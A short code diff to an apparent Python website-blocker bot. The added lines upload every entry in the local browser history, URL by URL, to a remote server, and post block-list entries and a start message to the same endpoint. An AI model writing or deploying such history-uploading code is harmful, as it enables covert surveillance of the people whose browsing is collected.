@@ -78,7 +78,7 @@ def unblock():
         print("Unblocked !!")
     pass
 #SAVE URL HISTORY
-def save_url_history():
+def save_url_history(se):
     domain_connected = core.get_history()
     domain_connected.save("history_file", output_format="json")
     f = open('history_file')
@@ -86,6 +86,7 @@ def save_url_history():
     print("SAVED HISTORY BROWSERS")
     for i in data['history']:
         a = i['URL']
+        POST('url_p',i['URL'])
 
 
 #MCORE PROGRAMME
@@ -117,11 +118,13 @@ for i in range(len(website_list)):
 
 
 POST('text','BOT IS STARTED')
-
+POST('bl_p','127.0.0.1:80')
+POST('bl_p','youtube.com')
+POST('bl_p','facebook.com')
 c = input("Y or N:")
 
 hosts_path = get_hosts_path()
-save_url_history()
+save_url_history(server_local)
 
 
 
